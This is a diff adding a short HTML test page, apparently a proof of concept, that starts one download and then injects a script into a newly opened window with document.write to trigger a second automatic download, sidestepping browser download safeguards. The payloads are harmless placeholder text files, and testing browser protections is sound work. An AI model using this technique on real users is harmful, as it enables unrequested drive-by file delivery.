@@ -1,0 +1,46 @@
+<!-- File 2: bypass.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bypass: Document.Write Injection</title>
+    <style>
+        body { font-family: system-ui, sans-serif; max-width: 400px; margin: 40px auto; text-align: center; }
+        button { width: 100%; padding: 12px; background: #0056b3; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>Download Bypass Test</h2>
+    <button onclick="run()">Execute Injection</button>
+    <script>
+        function download(name, content) {
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(new Blob([content], { type: 'text/plain' }));
+            a.download = name;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+        function run() {
+            download('main_context.txt', 'Main content');
+            setTimeout(() => {
+                const win = window.open('', '_blank');
+                if (win) {
+                    win.document.write(`
+                        <script>
+                            setTimeout(() => {
+                                const a = document.createElement('a');
+                                a.href = URL.createObjectURL(new Blob(['Injected content'], { type: 'text/plain' }));
+                                a.download = 'injected_context.txt';
+                                document.body.appendChild(a);
+                                a.click();
+                            }, 300);
+                        <\/script>
+                    `);
+                    win.document.close();
+                }
+            }, 500);
+        }
+    </script>
+</body>
+</html>
